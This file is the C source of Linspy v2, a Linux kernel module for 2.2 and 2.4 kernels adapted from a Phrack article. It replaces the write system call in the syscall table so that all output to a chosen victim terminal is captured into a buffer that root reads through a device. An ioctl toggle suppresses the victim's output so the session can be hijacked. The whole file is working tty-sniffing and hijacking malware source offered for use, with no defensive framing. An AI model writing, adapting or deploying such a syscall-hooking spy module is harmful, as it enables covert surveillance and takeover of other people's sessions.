/*
Linspy v2beta1
-Drago (Drago@Drago.com)

Linspy v2beta2  (13.04.2002) 
-xian (xian@pgp.pl) 
port for ?late 2.2 (syscall-list) and  2.4
tested on 2.4.18

Orignally:
           .oO Phrack 50 Oo.
          Volume Seven, Issue Fifty
                  5 of 16
 ============================================
 Abuse of the Linux Kernel for Fun and Profit
          halflife@infonexus.com
           [guild  corporation]
 ============================================
*/

/*
// Those includes are unnecessary at least for my 2.4.18 
// suppose it was copy pasted from other modules ...
// I'll check it on 2.2.13 and 2.2.20  - xian

#include <linux/sched.h>
#include <linux/mm.h>
#include <linux/malloc.h>
#include <linux/sched.h>
#include <linux/param.h>
#include <linux/resource.h>
#include <linux/signal.h>
#include <linux/string.h>
#include <linux/ptrace.h>
#include <linux/stat.h>
#include <linux/mman.h>
#include <linux/mm.h>
#include <asm/segment.h>
#include <asm/io.h>
#include <linux/version.h>
#include <asm/unistd.h>
*/
//Those are nescessary 
#include <linux/tty.h>  //tty controls 
#include <linux/kernel.h> // some useful functions 
#include <linux/times.h>
#include <linux/utsname.h>
#include <linux/config.h>
#include <linux/module.h>
#include <syscall.h>
#include <linux/fs.h>
#include <asm/uaccess.h>

#if CONFIG_MODVERSIONS==1
 #define MODVERSIONS
 #include <linux/modversions.h>
#endif

int errno;

/* set the version information, if needed */
#ifdef NEED_VERSION
 static char kernel_version[] = UTS_RELEASE;
#endif

#ifndef MIN
# define MIN(a,b)        ((a) < (b) ? (a) : (b))
#endif

/* ring buffer info */        

#define BUFFERSZ        65535
char buffer[BUFFERSZ];
int queue_head = 0;
int queue_tail = 0;

/* taken_over indicates if the victim can see any output */
int taken_over = 0;

static inline _syscall3(int, write, int, fd, char *, buf, size_t, count);
extern void *sys_call_table[];

/* device info for the ltap device, and the device we are watching */
static int ltap_major = 40;
int tty_minor = -1;
int tty_major = 4;

/* address of original write(2) syscall */
void *original_write;

void save_write(char *, size_t);


char out_queue(void) 
{
   char c;
   if(queue_head == queue_tail) return -1;
   c = buffer[queue_head];
   queue_head++;
   if(queue_head == BUFFERSZ) queue_head=0;
   return c;
}

char in_queue(char ch)
{
   if((queue_tail + 1) == queue_head) return 0;
   buffer[queue_tail] = ch;
   queue_tail++;
   if(queue_tail == BUFFERSZ) queue_tail=0;
   return 1;
}


/* check if it is the tty we are looking for */
int is_fd_tty(int fd)
{
   struct file *f=NULL;
   struct inode *inode=NULL;
   int mymajor=0;
   int myminor=0;
   
   if(fd >= NR_OPEN || !(f=current->files->fd[fd]) || !(inode=f->f_dentry->d_inode))
     return 0;
   mymajor = MAJOR(inode->i_rdev);
   myminor = MINOR(inode->i_rdev);
   if(mymajor != tty_major) return 0;
   if(myminor != tty_minor) return 0;
   return 1;
}

/* this is the new write(2) replacement call */
extern int new_write(int fd, char *buf, size_t count)
{
   int r;
   if(is_fd_tty(fd))
     {
	if(count > 0)
	  save_write(buf, count);
	if(taken_over) return count;
     }
   sys_call_table[SYS_write] = original_write;
   r = write(fd, buf, count); 
   sys_call_table[SYS_write] = new_write;
   return r;
}


/* save data from the write(2) call into the buffer */
void save_write(char *buf, size_t count)
{
   int i;
   for(i=0;i < count;i++) {
      //      in_queue(inb_p(buf+i));
      in_queue(buf[i]);
   }
}

/* read from the ltap device - return data from queue */
static ssize_t ltap_read(struct file *file, char *buf, size_t count, loff_t *ptr)
{
   int i;
   int c;
   int cnt=0;
   if(current->euid != 0) return 0;
   for(i=0;i < count;i++)
     {
	c = out_queue();
	if(c < 0) break;
	cnt++;
	buf[i]=c;
     }

   return cnt;
}

/* open the ltap device */
static int ltap_open(struct inode *in, struct file *fi)
{
   if(current->euid != 0) return -EIO;
   MOD_INC_USE_COUNT; /* we don't want to sbd unload our module while we're 
			playing */ 

   return 0;
}

/* close the ltap device */
static int ltap_close(struct inode *in, struct file *fi)
{
   taken_over=0;
   tty_minor = -1;
   MOD_DEC_USE_COUNT;
   return 0;
}

/* some ioctl operations */
static int ltap_ioctl(struct inode *in, struct file *fi, unsigned int cmd, unsigned long args)
{
#define LS_SETMAJOR     0
#define LS_SETMINOR     1
#define LS_FLUSHBUF     2
#define LS_TOGGLE       3
   
   if(current->euid != 0) return -EIO;
   switch(cmd)
     {
      case LS_SETMAJOR:
	tty_major = args;
	queue_head = 0;
	queue_tail = 0;
	break;
      case LS_SETMINOR:
	tty_minor = args;
	queue_head = 0;
	queue_tail = 0;
	break;
      case LS_FLUSHBUF:
	queue_head=0;
	queue_tail=0;
	break;
      case LS_TOGGLE:
	if(taken_over) taken_over=0;
	else taken_over=1;
	break;
      default:
	return 1;
     }
   return 0;
}


static struct file_operations ltap_fop = {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,4,0)
/* wersje 2.4 wymagaja podania informacji co jest czym, zamiast close
   release */
   owner:		THIS_MODULE,
   read:		ltap_read,
   ioctl:		ltap_ioctl,
   open:		ltap_open,
   release:		ltap_close,
#else
   NULL,
   ltap_read,
   NULL,
   NULL,
   NULL,
   ltap_ioctl,
   NULL,
   ltap_open,
   ltap_close,
   NULL
#endif
};
 

/* init the loadable module */
int init_module(void)
{
   printk("Linspy v2beta2 loaded\n");
   original_write = sys_call_table[SYS_write];
   sys_call_table[SYS_write] = new_write;
   if(register_chrdev(ltap_major, "linspy2", &ltap_fop)) return -EIO;
   return 0;
}

/* cleanup module before being removed */
void cleanup_module(void)
{
   printk("Linspy v2beta1 unloaded\n");
   sys_call_table[SYS_write] = original_write;
   unregister_chrdev(ltap_major, "linspy2");
}

